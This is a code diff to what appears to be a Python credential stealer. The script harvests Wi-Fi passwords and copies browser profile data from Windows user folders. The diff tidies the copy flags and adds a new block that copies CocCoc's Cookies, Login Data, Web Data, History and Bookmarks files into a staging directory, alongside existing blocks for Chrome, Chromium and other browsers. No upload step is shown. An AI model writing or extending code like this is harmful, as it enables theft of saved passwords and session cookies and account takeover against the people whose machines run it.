@@ -134,15 +134,7 @@ try:
 			networkpass("Все профили пользователей", "Содержимое ключа")
 
 		def browsers():
-			gccopy = False
-			ogxcopy = False
-			ocopy = False
-			fcopy = False
-			ycopy = False
-			vcopy = False
-			bcopy = False
-			cccopy = False
-			ccopy = False
+			gccopy = ogxcopy = ocopy = fcopy = ycopy = vcopy = bcopy = cccopy = ccopy = coccopy = False
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
 				src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
@@ -313,10 +305,30 @@ try:
 					ccopy = True
 				except OSError:
 					ccopy = True
-
+					
 
 			if ccopy == True:
 				print(" 	{+} Chromium")
+
+
+			if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
+				src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
+				if os.path.exists(dio + "\\CocCoc"):
+					shutil.rmtree(dio + "\\CocCoc")
+				os.makedirs(dio + "\\CocCoc")
+				try:
+					find("Cookies", src, "\\CocCoc\\")
+					find("Bookmarks", src, "\\CocCoc\\")
+					find("History", src, "\\CocCoc\\")
+					find("Login Data", src, "\\CocCoc\\")
+					find("Web Data", src, "\\CocCoc\\")
+					coccopy = True
+				except OSError:
+					coccopy = True
+					
+
+			if coccopy == True:
+				print(" 	{+} CocCoc")
 		browsers()
 
 		print(")")
